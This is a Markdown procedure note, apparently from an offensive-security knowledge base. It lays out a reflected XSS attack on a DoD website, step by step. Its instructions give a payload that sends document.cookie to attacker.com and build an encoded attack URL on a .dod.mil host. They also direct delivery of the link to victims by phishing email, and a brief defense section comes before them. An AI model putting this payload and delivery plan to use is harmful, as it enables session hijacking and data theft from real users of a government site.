---
tags:
  - xss
  - reflected-xss
  - exploitation
  - session-theft
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Use Alternate Authentication Material]]'
updated_at: '2025-12-14T03:15:47.114Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[JavaScript]]'
id: 6507897d-299c-49ce-9eb0-4200ddc638b6
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Use Alternate Authentication Material]]'
---
# Demonstrating-Reflected-XSS-with-Malicious-URL

## Summary

This procedure details crafting and delivering a malicious URL to exploit a known reflected XSS vulnerability, injecting JavaScript that executes in the victim's browser context. It is used to demonstrate impacts like stealing session cookies or modifying page content, particularly effective against trusted sites like government portals.

## Description

Targeting a DoD website with an identified reflection point, this involves URL-encoding a payload (e.g., document.cookie exfiltration) and tricking users into accessing it. The attack runs client-side on the Web platform, requiring no server access. Outcomes include script execution leading to data theft. Prerequisites: Confirmed vulnerable parameter from prior reconnaissance and a method to distribute the URL (e.g., email).

## Requirements

1. Valid vulnerable URL parameter from identification step.
2. URL encoder (browser console or online tool).
3. Social engineering vector to deliver the URL (e.g., phishing link).

## Defense

Defensive measures and detection strategies:

- Sanitize all reflected inputs using libraries like DOMPurify.
- Monitor for anomalous JavaScript execution via browser security tools or SIEM logs.
- Educate users on phishing and verify URLs before clicking.

## Objectives

1. Inject and execute arbitrary JavaScript in the browser.
2. Exfiltrate sensitive data like session tokens.
3. Alter page content to deceive or redirect users.

## Instructions

### Step 1: Craft Malicious Payload

**Context**: Create a JavaScript snippet that achieves the desired impact, such as alerting cookies for proof-of-concept.

Develop payload: <script>alert(document.cookie);< /script> or for exfiltration: <script>fetch('https://attacker.com?cookie='+document.cookie);< /script>.

> URL-encode special characters (e.g., < becomes %3C, > becomes %3E) to bypass basic filters.

### Step 2: Construct Malicious URL

**Context**: Append the encoded payload to the vulnerable parameter.

Build URL: https://target.dod.mil/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E.

> Test the URL in your own browser to verify execution without errors.

### Step 3: Deliver and Observe

**Context**: Simulate victim interaction by sharing the URL and monitoring execution.

Distribute via link shortening or email; upon click, the payload executes in the DoD site's context.

> Check attacker server logs for exfiltrated data or observe alert in a controlled test.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Use Alternate Authentication Material]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
- [[exploitation]]
- [[session-theft]]
